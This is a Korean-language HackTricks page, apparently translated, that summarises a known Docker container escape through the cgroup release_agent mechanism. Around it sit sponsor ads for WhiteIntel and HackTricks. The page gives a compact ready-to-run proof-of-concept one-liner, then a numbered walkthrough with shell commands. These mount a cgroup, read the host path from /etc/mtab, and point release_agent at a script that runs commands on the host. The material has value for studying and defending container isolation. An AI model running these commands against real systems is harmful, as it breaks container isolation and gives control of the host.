# Docker release_agent cgroups escape

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)은 **다크 웹**을 활용한 검색 엔진으로, 회사나 그 고객이 **스틸러 악성 코드**에 의해 **침해**당했는지 무료로 확인할 수 있는 기능을 제공합니다.

WhiteIntel의 주요 목표는 정보를 도난하는 악성 코드로 인한 계정 탈취 및 랜섬웨어 공격을 막는 것입니다.

그들의 웹사이트를 방문하여 엔진을 **무료**로 시험해 볼 수 있습니다:

{% embed url="https://whiteintel.io" %}

***

**자세한 내용은** [**원본 블로그 게시물**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) **를 참조하세요.** 이것은 요약입니다:

원본 PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
다음은 cgroups를 악용하는 방법을 시연하는 증명-of-concept (PoC)입니다. `release_agent` 파일을 생성하고 해당 파일을 트리거하여 컨테이너 호스트에서 임의의 명령을 실행하는 방법을 보여줍니다. 다음은 수행되는 단계를 설명합니다:

1. **환경 설정:**
* `/tmp/cgrp` 디렉토리를 생성하여 cgroup의 마운트 지점으로 사용합니다.
* RDMA cgroup 컨트롤러를 이 디렉토리에 마운트합니다. RDMA 컨트롤러가 없는 경우 `memory` cgroup 컨트롤러를 대안으로 사용하는 것이 제안됩니다.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **자식 Cgroup 설정:**
* 마운트된 cgroup 디렉토리 내에 "x"라는 이름의 자식 cgroup이 생성됩니다.
* "x" cgroup에 대한 알림은 notify\_on\_release 파일에 1을 쓰는 것으로 활성화됩니다.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **릴리스 에이전트 구성:**
* 호스트에서 컨테이너의 경로는 /etc/mtab 파일에서 얻습니다.
* 그런 다음 cgroup의 release\_agent 파일을 구성하여 획득한 호스트 경로에 위치한 /cmd 스크립트를 실행합니다.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd 스크립트 생성 및 구성:**
* /cmd 스크립트는 컨테이너 내부에 생성되고 ps aux를 실행하도록 구성되며, 출력을 컨테이너 내의 /output이라는 파일로 리다이렉트합니다. 호스트에서 /output의 전체 경로가 지정됩니다.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **공격 트리거:**
* "x" 자식 cgroup 내에서 프로세스가 시작되고 즉시 종료됩니다.
* 이로 인해 `release_agent` (/cmd 스크립트)가 트리거되어 호스트에서 ps aux를 실행하고 결과를 컨테이너 내의 /output에 작성합니다.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)은 **다크 웹**을 활용한 검색 엔진으로, 회사나 그 고객이 **스틸러 악성 소프트웨어**에 의해 **침해**당했는지 확인하는 **무료** 기능을 제공합니다.

WhiteIntel의 주요 목표는 정보를 도난하는 악성 소프트웨어로 인한 계정 탈취와 랜섬웨어 공격을 막는 것입니다.

그들의 웹사이트를 방문하여 엔진을 **무료**로 사용해 볼 수 있습니다:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**를 통해 제로부터 AWS 해킹을 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
